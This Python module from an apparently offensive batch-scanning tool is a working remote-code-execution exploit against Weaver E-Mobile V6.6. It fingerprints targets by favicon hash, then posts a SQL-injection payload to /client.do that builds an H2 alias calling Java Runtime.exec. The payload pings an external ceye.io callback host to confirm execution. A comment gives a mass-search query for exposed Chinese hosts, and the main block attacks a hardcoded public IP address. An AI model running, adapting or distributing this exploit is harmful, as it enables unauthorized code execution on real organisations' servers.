# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# app="泛微-EMobile" && country="CN"
# python batch.py -m exploit.web.OA.e-mobile.ecology -cs -fs "app=\"泛微-EMobile\" && country=\"CN\""

class Script(BaseScript):
    name = 'E-Mobile'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = 'https://forum.butian.net/share/84'
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/client.do']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = 'version == V6.6'
        self.favicon = ['41eca7a9245394106a09b2534d8030df',
                        '281348dd57383c1f214ffb8aed3a1210',
                        '9b1d3f08ede38dbe699d6b2e72a8febb',
                        'c27547e27e1d2c7514545cd8d5988946',
                        'f51746305f07a64eafa401adab364ad9']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5 or 'E-Mobile' in str(text):
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('E-Mobile Finger', url))
                                    return {'name': 'E-Mobile Finger', 'url': url, 'software': 'E-Mobile'}
        except Exception:
            return None

    async def exec(self):
        try:
            headers = self.headers.copy()
            headers.update({
                'Connection': "close",
                'Accept-Encoding': "gzip, deflate",
                'Accept': "*/*",
                'Content-Type': "application/x-www-form-urlencoded"
            })
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    randomNum = random.randint(10000, 99999)
                    data = "method=getupload&uploadID=1';CREATE ALIAS cs"+str(randomNum)+" AS CONCAT('void e(String cmd) throws java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex','ec(cmd);}');CALL cs"+str(randomNum)+"('ping weaver.client.0wtpsg.ceye.io');select+'1 "
                    async with session.post(url=url, data=data, headers=headers, timeout=10, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            tqdm.write(Fore.RED + '[{}] {}'.format('E-Mobile RCE', url))
                            return {'name': 'E-Mobile RCE', 'url': url, 'software': 'E-Mobile'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        # self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    semaphore = asyncio.Semaphore(500)
    sc = Script('221.0.183.26:8009', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
